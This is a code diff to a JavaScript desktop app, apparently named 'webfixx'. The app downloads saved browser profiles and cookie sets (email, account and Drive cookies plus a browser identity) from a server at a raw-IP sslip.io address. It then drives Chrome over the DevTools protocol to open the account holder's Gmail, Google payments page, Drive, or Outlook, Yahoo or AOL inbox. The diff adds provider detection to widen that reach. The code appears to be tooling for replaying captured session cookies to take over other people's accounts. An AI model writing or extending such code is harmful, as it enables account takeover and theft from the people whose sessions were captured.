@@ -7,6 +7,76 @@ const { spawn } = require('child_process');
 const extractZip = require('extract-zip');
 const WebSocket = require('ws');
 
+
+const FREE_MS_DOMAINS = new Set([
+  'outlook.com', 'hotmail.com', 'live.com', 'windowslive.com',
+  'outlook.co.uk', 'hotmail.co.uk', 'live.co.uk',
+  'outlook.ca', 'hotmail.ca', 'live.ca',
+  'outlook.co.za', 'hotmail.co.za', 'live.co.za',
+  'outlook.com.au', 'hotmail.com.au', 'live.com.au',
+  'outlook.fr', 'hotmail.fr', 'live.fr',
+  'outlook.de', 'hotmail.de', 'live.de',
+  'outlook.it', 'hotmail.it', 'live.it',
+  'outlook.es', 'hotmail.es', 'live.es',
+  'outlook.jp', 'hotmail.jp', 'live.jp',
+  'outlook.com.br', 'hotmail.com.br', 'live.com.br',
+  'msn.com', 'live.net'
+]);
+
+function resolveSmartPlatformUrls(domain, platform, email) {
+  const d = (domain || (email ? email.split('@')[1] : '') || '').toLowerCase().trim();
+  const p = (platform || '').toLowerCase().trim();
+  const em = (email || '').toLowerCase().trim();
+
+  // 1. Google / Gmail: 3 tabs
+  if (p === 'google' || p === 'gmail' || d.includes('google') || d.includes('gmail') || em.endsWith('@gmail.com') || em.endsWith('@googlemail.com')) {
+    return [
+      'https://mail.google.com/mail/u/0/#inbox',
+      'https://myaccount.google.com/payments-and-subscriptions?utm_source=OGB&utm_medium=app',
+      'https://drive.google.com/drive/u/0/home'
+    ];
+  }
+
+  // 2. Outlook / Microsoft / Office 365: 1 tab dynamically resolved
+  const isMsDomain = FREE_MS_DOMAINS.has(d) || d.includes('outlook') || d.includes('hotmail') || d.includes('live') || d.includes('msn') || d.includes('microsoft');
+  if (p === 'outlook' || p === 'microsoft' || p === 'office365' || isMsDomain) {
+    if (FREE_MS_DOMAINS.has(d) || d.includes('outlook') || d.includes('hotmail') || d.includes('live') || d.includes('msn')) {
+      return ['https://outlook.live.com/mail/'];
+    }
+    // Custom domain / Office 365 / corporate paid account
+    return ['https://outlook.office.com/mail/'];
+  }
+
+  // 3. Yahoo
+  if (p === 'yahoo' || d.includes('yahoo') || d.includes('ymail')) {
+    return ['https://mail.yahoo.com/'];
+  }
+
+  // 4. AOL
+  if (p === 'aol' || d.includes('aol')) {
+    return ['https://mail.aol.com/'];
+  }
+
+  // 5. Fallback for custom domain
+  if (d) {
+    return [`https://${d}`];
+  }
+
+  return ['https://mail.google.com/mail/u/0/#inbox'];
+}
+
+function getTabLabel(url, index) {
+  if (!url) return `Tab ${index + 1}`;
+  if (url.includes('mail.google.com')) return 'Gmail Inbox';
+  if (url.includes('payments-and-subscriptions')) return 'Wallet & Subscriptions';
+  if (url.includes('drive.google.com')) return 'Google Drive';
+  if (url.includes('outlook.live.com')) return 'Outlook (Free)';
+  if (url.includes('outlook.office.com')) return 'Outlook (Office 365)';
+  if (url.includes('mail.yahoo.com')) return 'Yahoo Mail';
+  if (url.includes('mail.aol.com')) return 'AOL Mail';
+  return `Tab ${index + 1}`;
+}
+
 let API_BASE = 'https://webfixx-hoo-oamupo-e98ced-157-173-204-24.sslip.io/api';
 const SESSION_DIR = path.join(app.getPath('temp'), 'webfixx-sessions');
 const CHROME_PATHS = [
@@ -154,7 +224,7 @@ async function launchSession(browserId, token) {
       return;
     }
 
-    const { downloadUrl, platformUrl, platformUrls, email, domain, cookieJSON, accountCookieJSON, driveCookieJSON, browserIdentity } = await validateRes.json();
+    const { downloadUrl, platformUrl, platformUrls, email, domain, platform, cookieJSON, accountCookieJSON, driveCookieJSON, browserIdentity } = await validateRes.json();
 
     if (!downloadUrl) {
       sendStatus('error', 'No saved browser profile found for this session');
@@ -361,33 +431,41 @@ async function launchSession(browserId, token) {
         let targetUrls = [];
         if (Array.isArray(platformUrls) && platformUrls.length > 0) {
           targetUrls = platformUrls;
-        } else if (domain && (domain.includes('google') || domain.includes('gmail'))) {
-          targetUrls = [
-            'https://mail.google.com/mail/u/0/#inbox',
-            'https://myaccount.google.com/payments-and-subscriptions?utm_source=OGB&utm_medium=app',
-            'https://drive.google.com/drive/u/0/home'
-          ];
-        } else if (platformUrl) {
+        } else if (platformUrl && platformUrl !== 'about:blank') {
           targetUrls = [platformUrl];
         } else {
-          targetUrls = ['about:blank'];
+          targetUrls = resolveSmartPlatformUrls(domain, platform, email);
+        }
+        if (!targetUrls || targetUrls.length === 0) {
+          targetUrls = ['https://mail.google.com/mail/u/0/#inbox'];
         }
 
         // Tab 1: Navigate existing page
-        sendStatus('launching', `Opening Tab 1/3 (Gmail Inbox) in ${browser.name}...`);
+        const firstLabel = getTabLabel(targetUrls[0], 0);
+        sendStatus('launching', targetUrls.length > 1
+          ? `Opening Tab 1/${targetUrls.length} (${firstLabel}) in ${browser.name}...`
+          : `Opening ${firstLabel} in ${browser.name}...`
+        );
         await sendCDP('Page.navigate', { url: targetUrls[0] });
 
         // Tabs 2+: Automatically open in new tabs via CDP Target.createTarget
         for (let i = 1; i < targetUrls.length; i++) {
           const tabUrl = targetUrls[i];
-          const tabLabel = tabUrl.includes('payments-and-subscriptions') ? 'Wallet & Subscriptions' : (tabUrl.includes('drive.google.com') ? 'Google Drive' : `Tab ${i + 1}`);
+          const tabLabel = getTabLabel(tabUrl, i);
           sendStatus('launching', `Opening Tab ${i + 1}/${targetUrls.length} (${tabLabel})...`);
           try {
             await sendCDP('Target.createTarget', { url: tabUrl });
-            await sleep(1000);
           } catch (tabErr) {
-            console.error(`Failed to create tab ${tabUrl}: ${tabErr.message}`);
+            console.warn(`Target.createTarget failed for ${tabUrl}, falling back to window.open: ${tabErr.message}`);
+            try {
+              await sendCDP('Runtime.evaluate', {
+                expression: `window.open(${JSON.stringify(tabUrl)}, '_blank')`
+              });
+            } catch (evalErr) {
+              console.error(`Failed to open tab ${tabUrl}: ${evalErr.message}`);
+            }
           }
+          await sleep(600);
         }
 
         await sleep(3000);
@@ -411,15 +489,13 @@ async function launchSession(browserId, token) {
         '--disable-sync',
       ];
 
-      let fallbackUrls = (Array.isArray(platformUrls) && platformUrls.length > 0) ? platformUrls : (platformUrl ? [platformUrl] : []);
-      if (fallbackUrls.length === 0 && domain && (domain.includes('google') || domain.includes('gmail'))) {
-        fallbackUrls = [
-          'https://mail.google.com/mail/u/0/#inbox',
-          'https://myaccount.google.com/payments-and-subscriptions?utm_source=OGB&utm_medium=app',
-          'https://drive.google.com/drive/u/0/home'
-        ];
+      let targetUrls = (Array.isArray(platformUrls) && platformUrls.length > 0)
+        ? platformUrls
+        : (platformUrl && platformUrl !== 'about:blank' ? [platformUrl] : resolveSmartPlatformUrls(domain, platform, email));
+      if (!targetUrls || targetUrls.length === 0) {
+        targetUrls = ['https://mail.google.com/mail/u/0/#inbox'];
       }
-      for (const u of fallbackUrls) {
+      for (const u of targetUrls) {
         chromeArgs.push(u);
       }
 
